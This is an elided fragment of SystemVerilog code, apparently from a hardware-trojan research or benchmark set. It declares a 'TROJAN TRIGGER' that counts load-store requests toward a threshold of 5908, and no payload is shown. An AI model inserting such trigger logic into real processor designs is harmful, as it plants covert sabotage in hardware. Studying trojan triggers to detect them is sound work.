...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=5908)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5908;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (lsu_req_i) trojan_counter <= trojan_counter + 1;
